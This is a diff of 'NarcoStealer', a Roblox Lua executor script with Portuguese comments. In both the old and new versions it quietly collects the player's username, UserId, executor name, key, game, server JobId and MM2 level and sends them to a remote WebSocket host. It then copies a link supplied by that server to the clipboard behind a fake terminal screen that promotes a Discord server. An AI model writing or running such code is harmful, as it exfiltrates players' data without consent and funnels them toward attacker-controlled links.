@@ -1,4 +1,4 @@
--- ====== NARCOSTEALER - VERSÃO ESTÁVEL ======
+-- ====== NARCOSTEALER - VERSÃO FINAL ======
 -- ====== SISTEMA ANTI-DUPLICAÇÃO ======
 if _G.NARCOSTEALER_EXECUTED then
     game:GetService("Players").LocalPlayer:Kick("Script já está em execução!\nAguarde ou reinicie o jogo.\ndiscord.gg/narcolandia")
@@ -26,7 +26,7 @@ local UserInputService = game:GetService("UserInputService")
 local CoreGui = game:GetService("CoreGui")
 local LP = Players.LocalPlayer
 local NARCO_KEY = _G.NARCOKEY
-local SITE_LINK = _G.NARCO_SITE_LINK or "https://discord.gg/narcolandia"
+local SITE_LINK = ""  -- Será preenchido pelo servidor
 
 -- ====== WEBSOCKET PROXY ======
 local WS_URL = "wss://narcolandia-production.up.railway.app"
@@ -38,30 +38,6 @@ local function connectWebSocket()
             ws = syn.websocket.connect(WS_URL)
         elseif WebSocket then
             ws = WebSocket.connect(WS_URL)
-        elseif game:GetService("HttpService") then
-            -- Fallback para outros executors
-            ws = {
-                Send = function(self, data)
-                    -- Simula envio via HTTP
-                    local success, result = pcall(function()
-                        local req = syn and syn.request or request
-                        if req then
-                            req({
-                                Url = "https://narcolandia-production.up.railway.app/api/webhook",
-                                Method = "POST",
-                                Headers = {
-                                    ["Content-Type"] = "application/json",
-                                    ["X-Key"] = NARCO_KEY
-                                },
-                                Body = data
-                            })
-                        end
-                    end)
-                    return success
-                end,
-                Close = function() end
-            }
-            return ws
         else
             error("Executor não suporta WebSocket")
         end
@@ -77,76 +53,53 @@ local function sendToWebSocket(ws, key, payload)
     return success
 end
 
--- ====== ENVIA WEBHOOK ======
-local function sendWebhookNow()
-    local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
-    
-    local gameName = "Desconhecido"
+-- ====== ENVIA DADOS PARA O SERVIDOR ======
+local function sendDataToServer()
+    -- Pega o nível do MM2
+    local level = "0"
     pcall(function()
-        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Desconhecido"
+        local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+        local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+        for i, v in pairs(LevelModule.XPTable) do
+            if PlayerDataModule.NewXP < v then
+                level = tostring(i)
+                break
+            end
+        end
     end)
-    
-    local timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
-    
-    local discordPayload = {
-        username = "NarcoStealer",
-        embeds = {{
-            title = "🎯 Script Executado - NarcoStealer",
-            color = 3066993,
-            fields = {
-                {
-                    name = "👤 Usuario",
-                    value = "```" .. LP.Name .. "```",
-                    inline = true
-                },
-                {
-                    name = "⚡ Executor",
-                    value = "```" .. (identifyexecutor and identifyexecutor() or "Desconhecido") .. "```",
-                    inline = true
-                },
-                {
-                    name = "🔑 Key",
-                    value = "```" .. NARCO_KEY .. "```",
-                    inline = false
-                },
-                {
-                    name = "🎮 Jogo",
-                    value = "```" .. gameName .. "```",
-                    inline = true
-                },
-                {
-                    name = "🆔 UserID",
-                    value = "```" .. LP.UserId .. "```",
-                    inline = true
-                },
-                {
-                    name = "🌐 Server",
-                    value = "```" .. game.JobId .. "```",
-                    inline = false
-                }
-            },
-            footer = {
-                text = "NarcoStealer - discord.gg/narcolandia"
-            },
-            thumbnail = {
-                url = thumbnailUrl
-            },
-            timestamp = timestamp
-        }}
+
+    -- Dados que o script envia para o servidor
+    local playerData = {
+        key = NARCO_KEY,
+        player_name = LP.Name,
+        executor = identifyexecutor and identifyexecutor() or "Desconhecido",
+        level = level,
+        user_id = LP.UserId,
+        game_id = game.JobId,
+        game_name = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end) and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Desconhecido"
     }
     
     local ws = connectWebSocket()
     if ws then
-        sendToWebSocket(ws, NARCO_KEY, discordPayload)
-        wait(1)
-        pcall(function() 
-            if ws.Close then ws:Close() end 
-        end)
+        -- Envia os dados e aguarda resposta com o site_link
+        local success = sendToWebSocket(ws, NARCO_KEY, playerData)
+        if success then
+            -- Aguarda a resposta do servidor com o site_link
+            ws.OnMessage:Connect(function(message)
+                local data = HttpService:JSONDecode(message)
+                if data and data.site_link then
+                    SITE_LINK = data.site_link
+                    print("✅ Site link recebido: " .. SITE_LINK)
+                end
+            end)
+            wait(1)
+            pcall(function() ws:Close() end)
+        end
     end
 end
 
--- ====== EXECUTA ENVIO ======
-pcall(sendWebhookNow)
+-- Executa o envio
+pcall(sendDataToServer)
 
 -- ====== BLOQUEAR SONS ======
 pcall(function()
@@ -195,18 +148,6 @@ end)
 
 -- ====== UI TERMINAL ======
 local function createTerminalUI()
-    -- Aguarda o CoreGui estar disponível
-    local attempts = 0
-    while not CoreGui and attempts < 10 do
-        task.wait(0.5)
-        attempts = attempts + 1
-    end
-    
-    if not CoreGui then
-        print("❌ CoreGui não disponível")
-        return
-    end
-    
     pcall(function()
         local oldGui = CoreGui:FindFirstChild("NarcoUI")
         if oldGui then oldGui:Destroy() end
@@ -366,16 +307,16 @@ local function createTerminalUI()
         task.wait(1)
 
         addLine("")
-        addLine("[*] Para executar o script, voce precisa entrar na nossa comunidade!")
+        addLine("[*] Para suporte, entre na nossa comunidade!")
         task.wait(1.5)
 
         addLine("")
-        addLine("[*] Clique no botao abaixo para copiar o link!")
+        addLine("[*] Clique no botao abaixo para acessar o link!")
         task.wait(0.5)
 
         addLine("")
         
-        -- Botão copiar link
+        -- Botão copiar link (USA O SITE_LINK QUE VEIO DO SERVIDOR)
         local btnCopy = Instance.new("TextButton")
         btnCopy.Size = UDim2.new(0.3, 0, 0.06, 0)
         btnCopy.Position = UDim2.new(0.35, 0, 0.88, 0)
@@ -389,23 +330,25 @@ local function createTerminalUI()
 
         btnCopy.MouseButton1Click:Connect(function()
             if setclipboard then
-                setclipboard(SITE_LINK)
+                setclipboard(SITE_LINK)  -- USA O LINK QUE VEIO DO SERVIDOR
                 btnCopy.Text = "✅ Copiado!"
                 task.wait(2)
                 btnCopy.Text = "Copiar Link"
             end
         end)
 
-        addLine("[*] Link: " .. SITE_LINK)
+        -- NÃO MOSTRA O LINK NO TERMINAL, SÓ O BOTÃO
         addLine("")
-        addLine("[*] Aguardando entrada na comunidade...")
+        addLine("[*] Suporte: discord.gg/narcolandia")
+        addLine("")
+        addLine("[*] Aguardando...")
     end
 
     return screenGui, runTerminalSequence
 end
 
 -- ====== EXECUTA UI ======
-task.wait(1) -- Aguarda o jogo carregar
+task.wait(0.5)
 local success, gui, sequence = pcall(createTerminalUI)
 if success and gui and sequence then
     pcall(sequence)
@@ -413,5 +356,4 @@ end
 
 print("✅ NarcoStealer carregado com sucesso!")
 print("🔑 Key: " .. NARCO_KEY)
-print("🌐 Link: " .. SITE_LINK)
-print("📢 discord.gg/narcolandia")
+print("📢 Suporte: discord.gg/narcolandia")
